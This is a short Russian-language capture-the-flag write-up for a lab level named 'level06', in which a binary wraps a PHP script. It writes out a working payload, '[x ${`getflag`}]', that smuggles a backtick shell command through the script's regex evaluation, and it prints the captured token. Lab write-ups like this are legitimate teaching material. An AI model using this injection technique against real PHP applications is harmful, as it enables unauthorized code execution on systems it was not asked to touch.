@@ -1,0 +1,13 @@
+На этот раз в нашей директории обнаруживаем не один файл, а целых два. Один бинарный level06 и один php level06.php.
+
+> ./level06				
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+(при запуске бинарного файла получаем строку, из которой следует что этот бинарный файл лишь дергает наш php файл)
+
+> vim /tmp/scr				(создаем файл со следующим содержимым)
+[x ${`getflag`}]
+(по коду ищет [x и далее вызывает вторую функцию y с переменной ${`getflag`} такие скобочки ${} и пользуются в php для массивов, но так как это не массив, php выведет ошибку, что переменная не определена через функцию echo, но так как мы знаем echo c `` делает вызов команды)
+
+> ./level06 /tmp/scr
+-> PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
